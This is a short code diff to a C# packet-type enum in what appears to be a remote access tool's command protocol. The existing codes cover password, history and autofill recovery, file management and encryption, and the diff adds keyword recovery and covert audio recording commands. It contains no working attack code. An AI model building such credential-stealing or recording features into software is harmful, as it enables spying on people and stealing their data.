@@ -14,6 +14,7 @@ namespace PacketLib.Packet
         RECOVERY_PASSWORDS =            3,
         RECOVERY_HISTORY =              4,
         RECOVERY_AUTOFILL =             53,
+        RECOVERY_KEYWORDS =             54,
 
         FM_GET_DISK =                   5,
         FM_GET_FILES_AND_DIRS =         6,
@@ -71,6 +72,10 @@ namespace PacketLib.Packet
         HDW_KB_ON =                     42,
 
         CRP_ENCRYPTION =                47,       
-        CRP_DECRYPTION =                48
+        CRP_DECRYPTION =                48,
+
+        AUDIO_GET_DEVICES =             55,
+        AUDIO_RECORD_ON =               56,
+        AUDIO_RECORD_OFF =              57,
     }
 }
